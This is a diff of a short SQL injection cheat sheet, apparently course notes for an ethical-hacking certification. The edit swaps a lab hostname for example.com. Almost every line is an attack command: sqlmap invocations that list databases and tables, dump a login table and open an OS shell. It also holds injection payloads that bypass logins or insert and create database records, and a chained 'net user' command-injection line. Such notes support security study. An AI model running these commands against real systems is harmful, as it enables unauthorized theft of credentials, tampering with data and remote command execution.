@@ -146,25 +146,25 @@ ping 127.0.0.1 | hostname | net user
 ### >>>>Module 15 : SQL Injection
 ```
 SQLMAP Extract DBS
-sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
+sqlmap -u “http://www.example.com/user.php?id=1” --cookie="xookies xxx" --dbs
 
 Extract Tables
-sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
+sqlmap -u “http://www.example.com/user.php?id=1” --cookie="cookies xxx" -D database --tables
 
 Extract Columns
-sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns
+sqlmap -u “http://www.example.com/user.php?id=1” --cookie="cookies xxx" -D database -T User_Login --columns
 
 Dump Data
-sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
+sqlmap -u “http://www.example.com/user.php?id=1” --cookie="cookies xxx" -D database -T Login --dump
 
 OS Shell to execute commands
-sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
+sqlmap -u “http://www.example.com/user.php?id=1” --cookie="cookies xxx" --os-shell
 
 Login bypass
 blah' or 1=1 --
 
 Insert data into DB from login
-blah';insert into login values ('john','apple123');
+blah';insert into login values ('robot','password');
 
 Create database from login
 blah';create database mydatabase;
